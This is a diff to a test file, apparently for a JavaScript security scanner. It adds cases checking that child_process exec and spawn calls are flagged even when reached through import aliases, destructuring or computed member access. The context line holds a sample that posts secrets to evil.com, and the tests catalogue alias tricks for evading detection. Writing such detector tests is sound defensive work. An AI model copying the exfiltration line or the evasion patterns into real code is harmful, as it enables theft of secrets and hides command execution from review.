@@ -293,6 +293,30 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
     }
   });
 
+  it("detects child_process exec through ESM import alias", () => {
+    const source = `
+import { spawn as launch } from "node:child_process";
+launch("node", ["server.js"]);
+`;
+    expectScanRule(source, { ruleId: "dangerous-exec", severity: "critical" });
+  });
+
+  it("detects child_process exec through CommonJS destructuring alias", () => {
+    const source = `
+const { exec: run } = require("child_process");
+run("node server.js");
+`;
+    expectScanRule(source, { ruleId: "dangerous-exec", severity: "critical" });
+  });
+
+  it("detects child_process exec through computed member access", () => {
+    const source = `
+import cp from "node:child_process";
+cp["spawn"]("node", ["server.js"]);
+`;
+    expectScanRule(source, { ruleId: "dangerous-exec", severity: "critical" });
+  });
+
   it("does not flag child_process import without exec/spawn call", () => {
     const source = `
 // This module wraps child_process for safety
